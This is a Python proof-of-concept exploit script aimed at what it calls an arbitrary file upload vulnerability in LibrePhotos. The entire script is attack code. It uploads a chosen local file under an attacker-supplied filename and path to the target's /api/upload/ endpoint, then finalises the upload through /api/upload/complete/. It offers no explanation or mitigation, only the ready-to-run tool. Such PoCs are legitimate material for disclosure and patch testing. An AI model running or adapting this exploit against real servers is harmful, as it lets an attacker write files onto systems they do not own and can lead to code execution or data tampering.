#!/usr/bin/env python3

import argparse
import requests
import hashlib
import os

def calculate_md5(file_path):
    hash_md5 = hashlib.md5()
    with open(file_path, "rb") as f:
        for chunk in iter(lambda: f.read(4096), b""):
            hash_md5.update(chunk)
    return hash_md5.hexdigest()

def chunked_upload(file_path, upload_url, complete_url, user_id, target_filename):
    md5_hash = calculate_md5(file_path)
    print(f"[*] MD5 hash of file: {md5_hash}")
    
    with open(file_path, 'rb') as file:
        files = {'file': (target_filename, file)}
        data = {
            'filename': target_filename,
            'user': user_id,
            'scan_directory': "tmp",
            'md5': md5_hash
        }
        
        response = requests.post(upload_url, files=files, data=data)
        
        if response.status_code != 200:
            print(f"[-] Upload initiation failed: {response.text}")
            return
        
        upload_id = response.json().get('upload_id')
        
        if not upload_id:
            print("[-] Failed to get upload_id from response")
            return
        
        print(f"[+] Upload initiated with upload_id: {upload_id}")
    
    data = {
        'upload_id': upload_id,
        'filename': target_filename,
        'user': user_id,
        'md5': md5_hash
    }
    
    response = requests.post(complete_url, data=data)
    
    if response.status_code == 500:
        print("[+] Upload completed successfully")
    else:
        print(f"[-] Upload completion failed: {response.text}")

def main():
    parser = argparse.ArgumentParser(description='File Upload Vulnerability PoC')
    parser.add_argument('--url', required=True, help='Base URL of the target application')
    parser.add_argument('--file', required=True, help='Path to the file to upload')
    parser.add_argument('--target', required=True, help='Target filename (including path) on the server')
    parser.add_argument('--user', default='1', help='User ID (default: 1)')

    args = parser.parse_args()

    upload_url = f"{args.url}/api/upload/"
    complete_url = f"{args.url}/api/upload/complete/"

    print("[!] LibrePhotos Arbitrary File Upload Vulnerability PoC")
    print(f"[*] Target URL: {args.url}")
    print(f"[*] File to upload: {args.file}")
    print(f"[*] Target filename: {args.target}")
    print(f"[*] User ID: {args.user}")

    chunked_upload(args.file, upload_url, complete_url, args.user, args.target)

if __name__ == "__main__":
    main()
